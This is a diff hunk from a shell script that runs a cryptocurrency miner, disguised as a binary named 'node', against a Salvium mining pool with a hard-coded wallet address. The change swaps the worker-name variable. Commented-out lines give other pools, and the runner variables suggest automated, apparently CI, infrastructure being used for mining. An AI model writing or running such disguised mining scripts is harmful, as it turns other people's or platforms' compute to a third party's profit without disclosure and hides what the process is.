@@ -38,7 +38,7 @@ echo "start ${INPUT_NUMBER}"
 #./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log
 
 # salvium
-START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=260000.crf_${WORKER_NUMBER} > try.log & sleep 1200 )
+START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=260000.crf_${INPUT_NUMBER} > try.log & sleep 1200 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${WORKER_NUMBER} -p m=solo > try.log & sleep 1200 )
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 
